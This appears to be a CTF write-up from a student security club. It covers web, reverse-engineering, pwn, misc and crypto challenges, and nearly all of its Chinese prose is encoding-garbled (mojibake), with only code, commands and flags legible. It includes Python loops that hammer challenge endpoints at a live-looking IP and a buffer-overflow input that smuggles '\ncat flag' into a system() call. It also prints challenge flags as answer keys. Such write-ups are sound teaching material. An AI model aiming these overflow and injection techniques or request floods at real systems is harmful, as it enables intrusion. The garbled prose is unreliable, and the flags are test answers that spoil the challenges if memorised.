# week1

## web

### è‹‡è‹‡å£ç®—

æ‰“å¼€ä¹‹åå‘ç°2så†…åšå‡ºå£ç®—é¢˜å°±ç®—èƒœåˆ©ï¼Œåšå®Œä¹‹åçœ‹åˆ°ä¼šå‘/end_gameå‘é€è¯·æ±‚ï¼Œè¯•è¯•å¼€å§‹æ¸¸æˆä¹‹åç›´æ¥end_gameï¼Œè¿˜çœŸç»™flagäº†å˜»å˜»ï¼Œå…¶å®è¿™æ˜¯éé¢„æœŸè§£ï¼Œç”±äºvvå¿˜è®°åŠ sessionidäº†ä¸ç„¶æ€ä¹ˆä¹Ÿæ˜¯å†™è„šæœ¬è€Œä¸æ˜¯äººå·¥ï¼Œä¸ç„¶æ¥ä¸åŠ

è¿˜æœ‰ç§è§£æ³•æ˜¯

çœ‹åˆ°äº†get_questionçš„è·¯ç”±ï¼Œè¿”å›äº†æ‰€æœ‰çš„é¢˜ç›®å’Œç­”æ¡ˆï¼Œè¿™æ—¶å€™å°†è¿”å›åŒ…æ”¹ä¸€ä¸‹ï¼Œæ”¹æˆé¢˜ç›®åªå‰©ä¸€é¢˜å†æ”¾å›å»ï¼Œ2så†…åšè¿™ä¸€é¢˜å°±å¯ä»¥äº†ï¼Œå°çŒ¿å£ç®—ä»¥å‰ä¹Ÿå­˜åœ¨è¿™ä¸ªæ¼æ´ã€‚

### éæ ‡å‡†å¯»è®¿

pythonå†™è„šæœ¬è·‘å¯ä»¥ï¼Œç”¨yakitä¸æ–­å‘åŒ…ä¹Ÿå¯ä»¥è¿™é‡Œè¿˜æ˜¯æ¨èå†™è„šæœ¬

f12æŸ¥çœ‹ç½‘ç»œï¼Œç‚¹å‡»æŠ½ä¸€å‘ï¼Œå‘ç°æŠ½å¡è¯·æ±‚æ˜¯/drawï¼Œå¹¶ä¸”ä¼šè¿”å›ä¸€ä¸ªjsonï¼Œå…¶ä¸­çš„typeè¡¨ç¤ºæŠ½å‡ºæ¥çš„æ˜¯å¦æ˜¯flag

```python
import requests
import json
while True:
    rep=requests.get('http://124.222.157.100:33106/draw').json()
    if rep['type']=='normal':
        pass
    else:
        print(rep)
        break
```

### æœ€çˆ½å°„å‡»æ¸¸æˆ

å¯ä»¥ç›´æ¥ä¼ scoreï¼Œä¹Ÿå¯ä»¥ä¿®æ”¹jsä¸­æ‰“ä¸­ä¸€æ¬¡åŠ çš„åˆ†æ•°

## re

### ez_reç­¾åˆ°

éšè—æ”¾åœ¨äº†å…´è¶£å°ç»„2024çš„Rev_new.mdä¹‹ä¸­ï¼Œæ—¨åœ¨æ£€æµ‹å…´è¶£å°ç»„çš„æ•™å­¦è´¨é‡ï¼Œè€ƒå¯ŸåŒå­¦ä»¬çš„ç»†å¿ƒç¨‹åº¦ã€‚ï¼ˆåœ¨è¯¾å ‚ä¸Šè¯´è¿‡ï¼‰

### ä½ çš„å¾®ç§¯åˆ†æœˆè€ƒæˆç»©

æœ¬é¢˜åŒå‡»è¿è¡Œåï¼Œå½“é€‰æ‰‹çš„infoçš„æˆç»©å¤§äºç­‰äº100åˆ†æ—¶,ç›´æ¥å¯ä»¥è·å¾—Flagã€‚

å†è€…ï¼Œå¦‚æœæˆç»©æœªæ»¡è¶³ifæ¡ä»¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°†å¯ä»¥åˆ©ç”¨REçš„å·¥å…·ï¼›é¦–å…ˆåˆ©ç”¨DIEæŸ¥çœ‹ï¼Œä¸º32ä½çš„upxåŠ å£³ï¼Œupx -d è„±å£³åï¼Œå³å¯æ‹–å…¥IDA-32bitä¸­æŸ¥çœ‹,å¿«æ·é”®shift +F12æŸ¥çœ‹å­—ç¬¦ä¸²å…³é”®è¯Flagæˆ–è€…ç›´æ¥æœç´¢Flagå…³é”®å­—ï¼Œä»”ç»†ç¿»é˜…å³å¯åœ¨ä¸€å †åŒåå­—ç¬¦ä¸²ä¸­æ‰¾åˆ°Flagã€‚

### DHU_LLM

æœ¬é¢˜æ— åŠ å£³ã€‚æœ¬é¢˜æœ‰ä¸¤ç§æ–¹å¼æ±‚è§£ï¼š

1.æ‹–å…¥IDA-32bitä¸­æŸ¥çœ‹,å¿«æ·é”®shift +F12æŸ¥çœ‹å­—ç¬¦ä¸²,å¯¹ä¼ ç»Ÿflagè¶³å¤Ÿæ•æ„Ÿçš„è¯ï¼Œåº”è¯¥å¯ä»¥è½»æ˜“å¾—åˆ°ç›¸å…³çš„l0v3_Cs7å­—æ ·ï¼Œè¿™æ˜¯ç®€ä¾¿çš„è§£æ³•ï¼Œæ—¨åœ¨è·³å‡ºå¸¦æœ‰flagçš„å­—çœ¼çš„å±€é™æ€§ã€‚

2.F5è§‚å¯Ÿå‡½æ•°Getflagï¼Œå¾ˆæ˜æ˜¾å·²ç»ç»™å‡ºç›¸å…³æç¤ºflagå°±åœ¨è¯¥å‡½æ•°é€»è¾‘ä¹‹ä¸­ï¼Œè¯¥å‡½æ•°æ˜¯ä¸€ä¸ªç®€å•çš„æ•°ç»„å¤åˆ¶ï¼Œåœ¨forå¾ªç¯ä¸­å¤åˆ¶ç­‰é•¿çš„secret[8]å­—ç¬¦è‡³flagæ•°ç»„ä¸­å»ï¼Œè€Œsecretå†…å®¹å°±åœ¨å…¨å±€å˜é‡å£°æ˜ä¸­ä¸ºconstå¸¸é‡ï¼Œè®¤çœŸè§‚å¯Ÿä¾¿å¯è§‚å¯Ÿåˆ°å…¶å€¼ï¼Œshift+e ç”±hexè½¬decimalä¾¿å¯å¾—åˆ°æ­£ç¡®flagï¼›

æ€»ç»“ä¸€ä¸‹ï¼Œå¸¸è§„æ–¹æ³•æ›´ä¸ºå¤æ‚ï¼Œéœ€è€ƒè™‘é€»è¾‘ï¼Œä½†æ˜¯ç®€æ˜“æ–¹æ³•è€ƒå¯Ÿæ€ç»´è·³è·ƒæ€§ã€‚

### RC4

ç›´æ¥å¯¹æ•°ç»„æ•°æ®è¿›è¡ŒRC4å³å¯è·å–flagï¼Œå¯†é’¥æ˜¯r00t2024

flagï¼šr00t2024{SyMm3TrY_1s_b3avt1fUl}

### maze

å¯ä»¥ä»mazeæ•°ç»„ä»¥åŠcheckå‡½æ•°çš„å†…å®¹ï¼Œå¾—åˆ°ä¸€ä¸ª6\*6çš„è¿·å®«ï¼Œå…¶ä¸­*æ˜¯å¢™å£ï¼Œ#æ˜¯å‡ºå£ï¼Œ00ä½ç½®ä¸ºèµ·ç‚¹

è¿·å®«å¦‚ä¸‹ï¼š
--\*\*\**
\*-\*\*\*\*
\*----\*
\*\*\*\*-\*
\*\*\#\*-\*
\*\*---\*
å¾—åˆ°è·¯å¾„ dssdddsssaaw,md5åŠ å¯†å¾—åˆ°flag
r00t2024{79787f885bff9cd490b77c40b7768b7d}

### babyxor

idaé‡Œæ‰¾åˆ°j((l*(*,c)/Gk++UkGa(mGsv(OG@(jeç„¶åå’Œ0x18è¿›è¡Œå¼‚æˆ–

## pwn

### test_your_nc

ncè¿ä¸Šç›´æ¥lsï¼Œcat flagå³å¯

### è°è¦ç‚¹èœ

å› ä¸º pwn é¢˜ç›®çš„ç‰¹æ®Šæ€§ï¼ŒåŸºæœ¬çŸ¥è¯†äº†è§£çš„ä¸æ·±åˆ»ï¼Œåšé¢˜ä¼šæœ‰äº›éš¾åº¦ï¼Œ ä½†æœ¬é¢˜æœ‰åŸºç¡€çš„åŒå­¦å¯ä»¥åšï¼ŒèŒæ–°ä¹Ÿå¯ä»¥é€šè¿‡é¢˜ç›®æè¿°æ‰¾åˆ°ç­”æ¡ˆå“¦ 

#### èŒæ–°æ€è·¯ï¼š

1. è¿è¡Œç¨‹åºï¼š

	

![image-20241126164722344](assests/11.png)

2.é¢˜ç›®æè¿°

![image-20241126164739105](assests/12.png)

3.é¢˜ç›®æè¿°å¯ä»¥çœ‹å‡ºï¼Œç‚¹äº†ä¸€é“ä¸å¤Ÿï¼Œåˆç‚¹äº†ä¸€é“è¿˜ä¸å¤Ÿï¼Œé‚£å’‹åŠå‘¢ï¼Œç‚¹ç¬¬ä¸‰é“è¯•è¯•

![image-20241126164755509](assests/13.png)

**å¯ä»¥çœ‹å‡ºè¾“å…¥ root ä¸‰æ¬¡å¾—åˆ°äº† flagï¼Œæ˜¯ä¸æ˜¯æœ‰ç‚¹è„‘ç»æ€¥è½¬å¼¯çš„**

#### åŸºç¡€æ€è·¯ï¼š

1.è¿è¡Œç¨‹åºï¼š

![image-20241126164846774](assests/14.png)

2.æ ¹æ®é¢˜ç›®æè¿°ï¼š

![image-20241126164901281](assests/15.png)

3.æ˜¯ r00t è¦ç‚¹èœï¼Œè¾“å…¥ r00t è¯•è¯•

![image-20241126164930078](assests/16.png)

è¾“å‡ºæœ‰é—®é¢˜

4.å°†å¯æ‰§è¡Œæ–‡ä»¶æ‹–å…¥ IDA åç¼–è¯‘æºç 

![image-20241126165000730](assests/17.png)

å¯ä»¥çœ‹åˆ° 

â‘  å°† ccccccat flag èµ‹å€¼ç»™ commandï¼Œä»£ç æœ€åæ‰§è¡Œäº†è¿™ä¸ªå‘½ä»¤ï¼Œä½†æ˜¯æ˜¾è€Œæ˜“ è§ï¼Œæ­£ç¡®çš„å‘½ä»¤åº”è¯¥æ˜¯ cat flag è€Œä¸æ˜¯ ccccat flag 

â‘¡ æœ‰ä¸€ä¸ª read å‡½æ•°å¯ä»¥è¾“å¦‚ 0x100 ä¸ªå­—èŠ‚çš„æ•°æ®ï¼Œä½†æ˜¯ buf çš„é•¿åº¦æ˜¯ 8 ä¸ªå­—èŠ‚ï¼Œ å› ä¸º__int64 ç±»å‹æ˜¯ long long ç±»å‹çš„ï¼Œé‚£ä¹ˆå¤šè¾“å…¥çš„æ•°æ®å°±ä¼šæº¢å‡ºè¦†ç›– buf åˆ°è¿™é‡Œï¼Œå¦‚æœå¯¹ pwn æœ‰äº›åŸºç¡€äº†è§£çš„åŒå­¦åº”è¯¥å¯ä»¥æƒ³åˆ°ï¼Œæˆ‘ä»¬ç°åœ¨çš„æ€è·¯å°±æ˜¯åˆ© ç”¨æ— é™åˆ¶é•¿åº¦è¾“å…¥çš„ read å‡½æ•°å»å°† ccccccat flag è¦†ç›–ä¸ºâ€¦â€¦\ncat flag,é‚£ä¹ˆ system å‡½æ•°é‡åˆ°\n,ä¼šå°†å‰åŠéƒ¨åˆ†å½“æˆä¸€ä¸ªå‘½ä»¤ï¼Œ\n ç¬¦åå½“æˆå¦ä¸€ä¸ªå‘½ä»¤ï¼Œä¹Ÿå°±æ‰§è¡Œäº†æˆ‘ ä»¬çš„ cat flagã€‚

5.é‚£ä¹ˆåº”è¯¥è¾“å…¥å¤šå°‘å­—èŠ‚å®ç°è¦†ç›–å‘¢

è¿™ä¸ªæ—¶å€™æœ‰ä¸¤ç§åŠæ³•ï¼Œä¸€ä¸ªæ˜¯ç”¨ IDA æŸ¥çœ‹é™æ€ä»£ç ï¼Œbuf è·ç¦» command æ˜¯ 0x1E-0x16=8 ä¸ªå­—èŠ‚ï¼Œccccccat flag ä¸­è¦è¦†ç›–å‰äº”ä¸ª cï¼Œä¹Ÿå°±æ˜¯ä¸€å…± 13 ä¸ªå­—èŠ‚ï¼Œå…¶ä¸­ç¬¬ 13 ä¸ªå­—èŠ‚åº”è¯¥æ˜¯\n,å‰ 12 ä¸ªå­—èŠ‚éšæ„ï¼Œå¦‚ä¸‹

![image-20241126165110149](assests/18.png)

æœ€åå¤šè¯´ä¸€å¥ r00tr00tr00t\n åˆšå¥½ä¹Ÿå¯ä»¥æ»¡è¶³ä¸Šé¢çš„ 12 ä¸ªå­—èŠ‚åŠ \n



## misc

### ç­¾åˆ°é¢˜

å…½è¯­è§£å¯†å°±å¯ä»¥äº†

### keyboard

ImageMagick

ImageMagickå®˜ç½‘ä¸Šå¯ä»¥ä¸‹è½½åˆ°[ä¸€é”®ä¸‹è½½](#windows)
![img](assests/wps1.jpg)![img](assests/wps2.jpg)ä¸€é”®ä¸‹ä¸€æ­¥å®‰è£…
åˆ°è·¯å¾„ä¸‹çœ‹ä¸‹åå­—ã€ç­‰ä¸‹æœ‰ç”¨
![img](assests/wps3.jpg)åˆ°éœ€è¦æ‹¼æ¥çš„å›¾ç‰‡ç›®å½•ä¸‹ï¼Œè°ƒç”¨cmd

magick montage *.png -tile 19x12 -geometry +0+0 flag.png

ä½¿ç”¨gaps

gaps --image=flag.png --generation=30 --population=900 

ç„¶åè§‚å¯Ÿé”®ç›˜è§£ç 

r00t{i_l_i_k_e_m_i_s_c}

### lappland

ç”¨010æ”¹é«˜åº¦å³å¯
r00t{she_is_so_beautiful}

### literally_me

è¯†å›¾å¾—çŸ¥è¿™æ˜¯é“¶ç¿¼æ€æ‰‹2049ä¸­çš„æˆªå›¾
r00t{ryan_gosling_1980_11_12}

### è¿™å°±æ˜¯æˆå›¾äº†å—ï¼Ÿ

åˆ†ç¦»æˆå›¾.pngæ–‡ä»¶ä¸­çš„zipå‹ç¼©åŒ…ï¼Œè§£å‹å¾—åˆ°å‰åŠæ®µflagçš„äºŒç»´ç ï¼Œç”¨Stegsolveæ‰“å¼€è‰ç¨¿.pngï¼ŒAnalyse->Image CombineråŠ å…¥æˆå›¾ï¼ŒæŸ¥çœ‹ä¸¤å›¾ç›¸å‡çš„ç»“æœï¼Œå¾—åˆ°ååŠæ®µflagçš„äºŒç»´ç 

### è¿˜ä¸å®Œï¼ŒçœŸçš„è¿˜ä¸å®Œ

ç¤¾ä¼šä¸»ä¹‰æ ¸å¿ƒä»·å€¼è§‚ç¼–ç å™¨
r00t{en_qing_zhen_de_huan_bu_wan}

### æˆ‘å–œæ¬¢æ‹‰æ™®å…°å¾·

f5éšå†™å³å¯
r00t{i_love_lappland}

### è€æ¸¸æ–°æ•´

ç¬¬ä¸€é—®â€œæ‰“é€šâ€ï¼š`r00t{h3s_a1w@y5_up_t0_s0meth1n9}`  
ç¬¬äºŒé—®â€œæ— ä¼¤â€ï¼š`r00t{h3_n3ver_le@v3_3m_hun9ry}`

é­”æ”¹ç‰ˆæœ¬çš„[ã€Šæ··ä¹±å¤§æªæˆ˜ã€‹åˆä»£](https://www.4399.com/flash/58793.htm)ï¼Œæ‰“åŒ…æˆäº†å¯ä»¥ç‹¬ç«‹è¿è¡Œçš„æ ¼å¼ã€‚é™¤å»ä¸€äº›é›¶ç¢ä¸”ä¸å½±å“æ¸¸æˆæ€§çš„å°æ”¹åŠ¨ï¼Œé­”æ”¹çš„éƒ¨åˆ†ä¸»è¦å›´ç»•æ·»åŠ çš„å¼€å±€æ­¦å™¨æ‹³å‡»æ‰‹å¥—ã€‚ä½œä¸ºå…¨æ¸¸æˆå”¯ä¸€ä¸€æ¬¾è¿‘æˆ˜æ­¦å™¨ï¼Œæ‹³å‡»æ‰‹å¥—å¨åŠ›ä¸ä¿—ï¼ˆå‡»é€€ç­‰åŒäºä¸­æ¡£ç‹™å‡»æªï¼‰ï¼Œä½†å¯¹ç©å®¶èµ°ä½è¦æ±‚æ›´é«˜ã€‚ä½¿ç”¨æ‹³å‡»æ‰‹å¥—é€šè¿‡æˆ˜å½¹æ¨¡å¼Boss 2æ—¶ï¼ˆæ¸¸æˆé‡Œæœ‰æç¤ºï¼›2Pæ—¶ä¸¤ä¸ªç©å®¶å¿…é¡»éƒ½æ»¡è¶³æ¡ä»¶ï¼‰å¯ä»¥è·å¾—ç¬¬ä¸€é—®flagï¼›è‹¥ä¸æŸå¤±å‘½æ•°æ— ä¼¤è¿‡å…³ï¼Œåˆ™å¯ä»¥åŒæ—¶è·å¾—ç¬¬ä¸€é—®å’Œç¬¬äºŒé—®flagã€‚flagè—äº1Pçš„ç©å®¶åä¸­ï¼Œæ–°å¼€ä¸€å±€æ¸¸æˆï¼Œåœ¨å±å¹•å·¦ä¸Šè§’çš„æ­»äº¡æŠ¥å‘Šé‡Œå°±èƒ½çœ‹è§ã€‚

é™¤äº†çœŸçš„åŠªåŠ›æ‰“é€šæ¸¸æˆä¹‹å¤–ï¼Œè¿™é“é¢˜è¿˜æœ‰ä¸¤ç§é¢„æœŸè§£ã€‚å…¶ä¸€æ˜¯æ›´CTFçš„è§£æ³•ï¼Œä»æ‰“åŒ…çš„EXEä¸­æå–Flashæ¸¸æˆæœ¬ä½“SWFæ–‡ä»¶ï¼ˆå®æµ‹ç”¨7-Zipçš„Parseræ¨¡å¼å°±å¯ä»¥åšåˆ°ï¼‰ï¼Œç„¶åç”¨JPEXSä¹‹ç±»çš„åç¼–è¯‘å·¥å…·å°±èƒ½çœ‹åˆ°æ¸¸æˆæºç äº†ï¼Œä¸¤ä¸ªflagéƒ½åœ¨æ¸¸æˆç¬¬ä¸€å¸§çš„åŠ¨ä½œè„šæœ¬é‡Œã€‚å…¶äºŒæ˜¯ä½œå¼Šï¼›äºŒé˜¶æ®µæç¤ºå’Œé­”æ”¹è¿‡çš„Creditsé¡µé¢éƒ½æåˆ°äº†ä½œå¼Šç ï¼Œä¸”ä¸€ä¸ªæš—ç¤ºä¸€ä¸ªæ˜ç¤ºäº†ä½œå¼Šç æ˜¯ä»€ä¹ˆã€‚åœ¨æ¸¸æˆä¸­æŒ‰å‡º[ç§‘ä¹ç¾ç§˜æŠ€](https://baike.baidu.com/item/%E7%A7%91%E4%B9%90%E7%BE%8E%E7%A7%98%E6%8A%80/204021)â€œä¸Š-ä¸Š-ä¸‹-ä¸‹-å·¦-å³-å·¦-å³-å¼€æª-ç‚¸å¼¹â€å³å¯æŠŠå‘½æ•°æ”¹ä¸º30å¹¶å¼€å¯æŠ¤ç›¾ï¼ŒåŒæ—¶è·å¾—æˆ˜å½¹ç¬¬å…«å…³åŒæ¬¾ä¸€å‡»å¿…æ€ç‹™å‡»æªã€‚å¯¹æ‰“Bossçš„å®é™…æ•ˆæœè€Œè¨€ï¼Œåªè¦æœ‰åŸºæœ¬èµ°ä½ä¿è¯ä¸ä¼šè¢«è¿ç»­è¿æ‹›å¸¦èµ°ï¼Œ30æ¡å‘½è§£å†³Bosså·²ç»ç›¸å½“è¶³å¤Ÿï¼›â€œæ— ä¼¤â€çš„åˆ¤å®šåªè¦æ±‚å‰©ä½™å‘½æ•°å¤§äºå…³å¡å¼€å§‹æ—¶çš„å‘½æ•°ï¼Œæ•…ç¬¬äºŒä¸ªflagä¹Ÿæ˜¯è½»æ¾å¯è§£ã€‚

#### èŠ±çµ®

çˆ·é’å›ï¼ç»ˆäºæœ‰æœºä¼šç”¨å°æ—¶å€™æœ€å–œæ¬¢çš„å°æ¸¸æˆä¹‹ä¸€å‡ºé¢˜äº†ã€‚æ­£å¥½æœ€è¿‘åœ¨å†™[è¿™æ¬¾æ¸¸æˆçš„TCRFé¡µé¢](https://tcrf.net/Gun_Mayhem)ï¼Œä»ä»£ç é‡Œç¿»å‡ºæ¥äº†åŸå¼€å‘è€…åšåˆ°80%ä½†å¼ƒå‘äº†çš„æ‹³å‡»æ‰‹å¥—ï¼Œè§‰ç€â€œåœ¨æªæˆ˜æ¸¸æˆé‡Œä¸å¼€æªæ˜¯ä¸€ä»¶å¾ˆé…·çš„äº‹æƒ…â€ï¼Œå°±æŠŠä»£ç æ¢å¤å‡ºæ¥å‡ºæˆé¢˜äº†ã€‚è¯´èµ·æ¥ï¼Œé„™äººå…¶å®æ›´å–œæ¬¢ç©ã€Šæ··ä¹±å¤§æªæˆ˜2ã€‹ï¼Œæ€å¥ˆè¿™ä¸€éƒ¨æˆ˜å½¹å…³å¡å¤ªå¤šï¼ŒçœŸè¦å‡ºæˆé¢˜å°±å¤ªè¿‡åç‰¢äº†ã€‚è‡³äºã€Šæ··ä¹±å¤§æªæˆ˜Reduxã€‹ï¼ˆ4399ä¸Šå«ã€Šæ··ä¹±å¤§æªæˆ˜æ–°ç‰ˆã€‹ï¼‰â€¦â€¦ç­‰æˆ‘å•¥æ—¶å€™èƒ½æ‰“é€šäº†å†è¯´å§â€¦â€¦

è¿™é“æ¸¸æˆé¢˜å…¶å®æœ€æ—©æ˜¯æƒ³å‡ºMCé¢˜çš„ï¼Œå¤§ä½“æ€è·¯æ˜¯ç±»ä¼¼â€œæ‰“ç¾½æ¯›çƒâ€ä½†æ¢æˆæ½œè¡Œç©æ³•ï¼Œå»¶ç»­å¥¶èŒ¶é¢˜æ•…äº‹çº¿ï¼›ä¸è¿‡æ•°æ®åŒ…å†™åˆ°ä¸€åŠè‡ªå·±è¯•ç©çš„æ—¶å€™å‘ç°ä¸æ˜¯ä¸€èˆ¬çš„åç‰¢ï¼Œå°±å¼ƒå‘äº†ï¼ˆ

æœ¬é¢˜ç¬¬äºŒé—®å‘xyyè°¢âœŒè‡´æ•¬ï¼Œè®©æˆ‘ä»¬æ°¸è¿œé“­è®°ä»–å‚åŠ CTFæ¯”èµ›æœŸé—´ä»åœ¨æŒ‘æˆ˜è‡ªå·±ï¼Œåšåˆ°äº†é˜Ÿå†…é¦–ä¾‹æ— ä½œå¼Šæ— ä¼¤æ‹³å¥—æ‰“é€šBossçš„è‹±å‹‡äº‹è¿¹ã€‚~~æ˜æ˜åªæ˜¯å«ä»–æ¥æµ‹è¯•ä¸‹æ¸¸æˆéš¾åº¦çš„ï¼ŒæŠ–Mäººè®¾åå®äº†~~ ~~è¿™å›ä½ ä»¬çŸ¥é“Bossæ‰“ä¸è¿‡å‡ºä¸äº†flagåº”è¯¥å»æš´æ‰“è°äº†å§~~



## crypto

### å¬è¯´ä½ å­¦æ‡‚äº†base64

é¦–å…ˆæ ¹æ®é¢˜ç›®æè¿°ï¼Œç”¨010æ‰“å¼€pngï¼Œå¾—åˆ°ä¸€ä¸²ï¼š

```
i think u need this : 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/=
```

å¯çŸ¥è¿™æ˜¯æ›¿æ¢åçš„æ–°è¡¨ã€‚

ç„¶åæ‰“å¼€å¯†æ–‡åï¼Œå‘ç°ä»–æ˜¯ä¸€è¡Œä¸€è¡Œçš„base64ï¼Œä¸æˆ‘ä»¬å¸¸è§çš„ä¸€æ•´æ®µï¼Œåªæœ‰æœ«å°¾æœ‰ç­‰å·çš„base64ä¸å¤ªä¸€æ ·ã€‚è¿™é‡Œå®é™…ä¸Šæ˜¯åˆ©ç”¨äº†base64ç­‰å·å…¶å®æ˜¯å› ä¸ºä¸è¶³å…­ä½è€Œè¡¥0å¾—åˆ°çš„ï¼Œç”±äºåœ¨è§£å¯†çš„æ—¶å€™æœ«å°¾çš„å¡«å……ä¼šè¢«çœç•¥å»ï¼Œæ‰€ä»¥å®é™…ä¸Šæˆ‘ä»¬å¯ä»¥åœ¨å¡«å……çš„ä½ç½®éšè—æˆ‘ä»¬æƒ³è¦çš„ä¿¡æ¯ï¼Œäº‹å®ä¸Šflagä¹Ÿè¢«éšè—åœ¨è¿™é‡Œã€‚

åˆ©ç”¨è„šæœ¬æå–ï¼Œæ³¨æ„ï¼Œå› ä¸ºä¸€è¡Œæœ€å¤šèƒ½è—ä¸¤ä¸ªç­‰å·çš„ä¿¡æ¯ï¼Œæ‰€ä»¥è¡Œæ•°å¾ˆå¤šï¼Œå…¶å®ä¹Ÿç»™äº†æˆ‘ä»¬ä¸€ä¸ªæé†’ï¼Œå¦‚æœä»¥åé‡åˆ°äº†è¡Œæ•°å¾ˆå¤šçš„base64ï¼Œå¤§æ¦‚ç‡å°±æ˜¯è¿™æ ·éšè—çš„

```python
d = '''

'''  # å°†åŠ å¯†åçš„å†…å®¹æ”¾åˆ°è¿™ä¸ªå¤šè¡Œå­—ç¬¦ä¸²ä¸­

base64chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/="
e = d.splitlines()  # å°†è¾“å…¥å­—ç¬¦ä¸²æŒ‰è¡Œåˆ†å‰²
binstr = ""  # åˆå§‹åŒ–äºŒè¿›åˆ¶å­—ç¬¦ä¸²ä¸ºç©º

# éå†æ¯è¡Œå†…å®¹
for i in e :
    if i.find("==")>0:
        temp=bin((base64chars.find(i[-3])&15))[2:]
    #å–å€’æ•°ç¬¬3ä¸ªå­—ç¬¦ï¼Œåœ¨base64æ‰¾åˆ°å¯¹åº”çš„ç´¢å¼•æ•°ï¼ˆå°±æ˜¯ç¼–ç æ•°ï¼‰ï¼Œå–ä½4ä½ï¼Œå†è½¬æ¢ä¸ºäºŒè¿›åˆ¶å­—ç¬¦
        binstr=binstr + "0"*(4-len(temp))+temp #äºŒè¿›åˆ¶å­—ç¬¦è¡¥é«˜ä½0åï¼Œè¿æ¥å­—ç¬¦åˆ°binstr
    elif i.find("=")>0:
        temp=bin((base64chars.find(i[-2])&3))[2:] #å–å€’æ•°ç¬¬2ä¸ªå­—ç¬¦ï¼Œåœ¨base64æ‰¾åˆ°å¯¹åº”çš„ç´¢å¼•æ•°ï¼ˆå°±æ˜¯ç¼–ç æ•°ï¼‰ï¼Œå–ä½2ä½ï¼Œå†è½¬æ¢ä¸ºäºŒè¿›åˆ¶å­—ç¬¦
        binstr=binstr + "0"*(2-len(temp))+temp #äºŒè¿›åˆ¶å­—ç¬¦è¡¥é«˜ä½0åï¼Œè¿æ¥å­—ç¬¦åˆ°binstr
str_ = bytearray()
for i in range(0, len(binstr), 8):
    if i + 8 <= len(binstr):
        index = int(binstr[i:i + 8], 2)  # æ¯ 8 ä½è½¬æ¢ä¸ºç´¢å¼•å€¼
        if 0 <= index < 256:  # ç¡®ä¿ç´¢å¼•å€¼åœ¨æœ‰æ•ˆèŒƒå›´å†…
            str_.append(index)  # è¿½åŠ å­—èŠ‚æ•°æ®åˆ° bytearray

print(str_.decode('utf-8'))  
```

### çŒ«çŒ«å¯†ç 

æ ¹æ®è§‚å¯Ÿï¼Œä»¥åŠé¢˜ç›®æç¤ºï¼Œ`ä¸æ˜¯æˆ‘ä¸æƒ³è®©ä»–å°å†™ï¼Œè€Œæ˜¯çœŸçš„æ²¡æœ‰å°å†™`ï¼Œå¯ä»¥æƒ³åˆ°æ‘©æ–¯å¯†ç æ˜¯æ— æ³•åˆ†è¾¨å¤§å°å†™çš„ã€‚

åˆå› ä¸ºå…¨ç¯‡åªæœ‰ä¸¤ç§é‡å¤ï¼Œ`å–µå–µï¼Ÿ`å’Œ`å–µå–µå–µ`ï¼Œäºæ˜¯å°è¯•ä¸€ä¸‹ä¸€ä¸ªæ˜¯`.`ä¸€ä¸ªæ˜¯`-`å³å¯ï¼š

```python
str = ""
count = 0
output = ""
with open ('flag.txt','r',encoding='utf-8') as f:
    for line in f:
       str += line
for i in str:
    if i == "å–µ":
        if count == 2:
            output += '.'
            count = 0
        else:
            count += 1
    elif i == "ï¼Ÿ":
        output += '-'
        count = 0
    elif i == " ":
        output += ' '
print(output)
```

### ä»¿å°„ä»¿å°„

å®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªæŠŠ26ä¸ªå­—æ¯æ‹“å±•åˆ°31ä¸ªå­—ç¬¦çš„ä»¿å°„ï¼Œæ³¨æ„aå’Œmè¦äº’ç´ ï¼Œè¿™é‡Œa=30ï¼Œmæ˜¯31ï¼Œå¦‚æœè¿˜æ˜¯æŒ‰ç…§26çš„è¯ï¼Œå°±æ²¡æœ‰aé€†äº†



# week2

## web

### è‹‡è‹‡å£ç®—å‡çº§ç‰ˆ

è¿™æ¬¡æ¯é“é¢˜éƒ½éœ€è¦å‘å›æœåŠ¡å™¨æ£€æŸ¥ï¼Œé‚£æ²¡åŠæ³•äº†ï¼Œåªèƒ½å†™è„šæœ¬å¿«é€Ÿåšé¢˜äº†

```python
import requests
import time

BASE_URL = "http://127.0.0.1:8800"  # ä¿®æ”¹ä¸ºä½ çš„æœåŠ¡å™¨åœ°å€

# å¯åŠ¨æ¸¸æˆ
def start_game():
    response = requests.post(f"{BASE_URL}/start_game")
    if response.status_code == 200:
        print("Game started successfully.")
    else:
        print("Failed to start the game.")
        exit(1)

# è·å–é—®é¢˜
def get_question():
    for _ in range(3):  # å°è¯•3æ¬¡è·å–é—®é¢˜
        response = requests.get(f"{BASE_URL}/get_question")
        if response.status_code == 200:
            data = response.json()
            if "question" in data:
                return data.get("question")
            else:
                time.sleep(0.1)  # å¦‚æœè·å–é—®é¢˜å¤±è´¥ï¼Œç­‰å¾…0.1ç§’å†è¯•
    print("Failed to get question after 3 attempts.")
    exit(1)

# æäº¤ç­”æ¡ˆ
def submit_answer(answer):
    response = requests.post(f"{BASE_URL}/submit_answer", json={"answer": answer})
    if response.status_code == 200:
        data = response.json()
        print(data)
        return data
    else:
        print("Failed to submit answer.")
        exit(1)

# è‡ªåŠ¨ç­”é¢˜è„šæœ¬
def auto_play():
    start_game()
    correct_count = 0

    while correct_count < 10:
        question = get_question()
        if question:
            # è§£æé¢˜ç›®
            num1, _, num2 = question.split()
            num1, num2 = int(num1), int(num2)

            # è®¡ç®—ç­”æ¡ˆ
            if num1 > num2:
                answer = ">"
            elif num1 < num2:
                answer = "<"
            else:
                answer = "="

            # æäº¤ç­”æ¡ˆå¹¶è·å–ç»“æœ
            result = submit_answer(answer)
            if result.get("status") == "correct":
                correct_count += 1
                print(f"Answered correctly: {correct_count}/10")
            elif result.get("status") == "incorrect":
                print("Incorrect answer, game over.")
                break
        time.sleep(0.1)  # ç¡®ä¿ä¸ä¼šå¤ªå¿«ä»¥é˜²æœåŠ¡å™¨å‹åŠ›è¿‡å¤§


if __name__ == "__main__":

    auto_play()

```

### éæ ‡å‡†å¯»è®¿åè®°

